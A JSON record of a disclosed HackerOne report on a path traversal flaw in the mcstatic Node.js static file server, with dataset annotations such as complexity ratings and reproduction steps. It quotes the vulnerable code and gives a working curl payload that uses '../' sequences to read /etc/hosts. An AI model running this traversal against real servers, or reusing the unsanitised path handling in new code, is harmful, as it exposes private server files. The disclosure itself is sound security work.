{
  "reported_to": "Node.js third-party modules",
  "reported_by": "bl4de ",
  "title": "[mcstatic] Path Traversal allows to read content of arbitrary files",
  "content": "\nHi Guys,\nThere is Path Traversal in mcstatic module.\nIt allows to read content of arbitrary files on the remote server.\nModule\nmcstatic\nThis is a general file server made by nodejs. It will be easy for you to access the files on the server through the browser.\nhttps://www.npmjs.com/package/mcstatic\nversion: 0.0.20\nStats\n0 downloads in the last day\n38 downloads in the last week\n150 downloads in the last month\n~1800 estimated downloads per year\nDescription\nLack of file path sanitization causes that any file on the server might be read by malicious user.\nIf we follow code flow, we find that first file name is read from req.url and check if exists:\nCode 436 Bytes\n1// node_modules/mcstatic/lib/staticFileHandler.js, line 19:\n2    var filePath = httpHelpers.getRequestPathFromUrl(req.url);\n3    var mockedFilePath = findMockFilePath(filePath,mockPaths);\n4    if(mockedFilePath)\n5        filePath = mockedFilePath;\n6\n7    var file = path.normalize(path.join(root,filePath));\n8    fs.stat(file,function(error, stats){\n9        if(error)\n10            return statusHandlers[500](res, nextHandler, { error: error });\nDepends on HTTP method used, handler function is called (here's for GET):\nCode 158 Bytes\n1// node_modules/mcstatic/lib/staticFileHandler.js, line 39:\n2if (req.method === 'GET')\n3        return responseHandlers.handleGet(res,file, stats, nextHandler);\nhandleGet maps to streamResponse in responseHanders.js:\nCode 429 Bytes\n1// node_modules/mcstatic/lib/responseHandlers.js, line 22:\n2var streamResponse = function(res, file, stat, next){\n3    var stream = fs.createReadStream(file);\n4    res.setHeader('content-length', stat.size);\n5\n6    stream.pipe(res);\n7    stream.on('error', function (err) {\n8        statusHandlers['500'](res, next, { error: err });\n9    });\n10\n11    stream.on('end', function () {\n12        res.statusCode = 200;\n13        res.end();\n14    });\n15};\nWe can see (line 23) that stream is created directly from file and piped to res response object.\nSteps To Reproduce:\ninstall mcstatic:\nCode 22 Bytes\n1$ npm install mcstatic\nrun mcstatic in direcotry of your choice:\nCode 102 Bytes\n1me:~/playground/hackerone/Node$ ./node_modules/mcstatic/bin/mcstatic \n2mcstatic serving ./ on port 8080\nexecute following curl command (adjust number of ../ to reflect your system):\nCode 69 Bytes\n1$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/hosts\nsee result:\nCode 610 Bytes\n1*   Trying 127.0.0.1...\n2* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n3> GET /../../../../../etc/hosts HTTP/1.1\n4> Host: 127.0.0.1:8080\n5> User-Agent: curl/7.47.0\n6> Accept: */*\n7> \n8< HTTP/1.1 200 OK\n9< last-modified: Tue, 23 Jan 2018 14:51:52 GMT\n10< content-length: 188\n11< content-type: application/octet-stream\n12< Date: Tue, 06 Feb 2018 15:40:51 GMT\n13< Connection: keep-alive\n14< \n15127.0.0.1\tlocalhost\n16127.0.1.1\tLT0081U2\n17\n18# The following lines are desirable for IPv6 capable hosts\n19::1     localhost ip6-localhost ip6-loopback\n20ff02::1 ip6-allnodes\n21ff02::2 ip6-allrouters\n22* Connection #0 to host 127.0.0.1 left intact\nSupporting Material/References:\nUbuntu 16.04 LTS\nChromium 66.0.3333.0 (Developer Build) (64-bit)\nNode.js version: v8.9.4 LTS\nnpm version: 5.6.0\ncurl 7.47.0\nPlease feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.\nI hope my report will help to keep Node.js ecosystem and its users safe in the future.\nRegards,\nRafal 'bl4de' Janicki\nImpact\nThis vulnerability allows to read content of any file on the server where module is run.\n\n",
  "severity": [
    8.6,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Path Traversal"
  ],
  "screenshots": {},
  "disclosed_date": 1524613560,
  "report_url": "https://hackerone.com/reports/312907",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install mcstatic using npm: `npm install mcstatic`"
    ],
    [
      2,
      "Run mcstatic in a directory of your choice and use curl to access arbitrary files with path traversal: `curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/hosts`"
    ]
  ],
  "vuln_description": "The mcstatic module for Node.js suffers from a path traversal vulnerability due to insufficient sanitization of file paths. This allows an attacker to read arbitrary files on the server by manipulating the URL to include relative path traversal sequences (e.g., '../../').",
  "reason": "The vulnerability is straightforward to exploit as it involves a common path traversal technique without requiring complex interactions between components or manipulation of application state. The attack vector is direct and well-documented in security contexts.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}